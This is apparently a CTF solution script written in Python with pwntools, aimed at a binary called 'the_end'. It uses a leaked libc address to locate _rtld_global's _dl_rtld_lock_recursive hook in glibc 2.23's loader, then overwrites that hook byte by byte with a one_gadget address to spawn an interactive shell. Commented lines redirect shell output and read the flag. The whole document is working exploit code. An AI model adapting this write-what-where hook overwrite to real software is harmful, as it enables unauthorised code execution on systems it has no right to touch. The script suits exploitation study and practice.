#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import re
import sys
context.binary = "./the_end"
#  context.log_level = 'debug'

io = process("./the_end")
#io = remote("127.0.0.1", 9999)
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')

offset_ld_base_of_libc_base = 0x3ca000 #调试一下出来的
offset_dl_rtld_lock_recursive_of_rtld_global = 0xf08

raw_input("DEBUG: ")
io.recvuntil("gift ")
libc_base = int(io.recvuntil(",", drop = True), 16) - libc.sym['sleep']
io.recvuntil("good luck ;)")
success("libc_base -> {:#x}".format(libc_base))

one_gadget = libc_base + 0xf02a4
ld_base = libc_base + offset_ld_base_of_libc_base
_rtld_global = ld_base + ld.symbols['_rtld_global']
target = _rtld_global + offset_dl_rtld_lock_recursive_of_rtld_global

success("target -> {:#x}".format(target))
success("one_gadget -> {:#x}".format(one_gadget))

pause()
for i in xrange(5):
    io.send(p64(target + i))
    sleep(0.01)
    io.send(p64(one_gadget)[i])
    sleep(0.01)

#  pause()
context.log_level = "debug"
#  io.sendline("exec /bin/sh 1>&0\0")
#  io.sendline("cat flag >&0")

io.interactive()
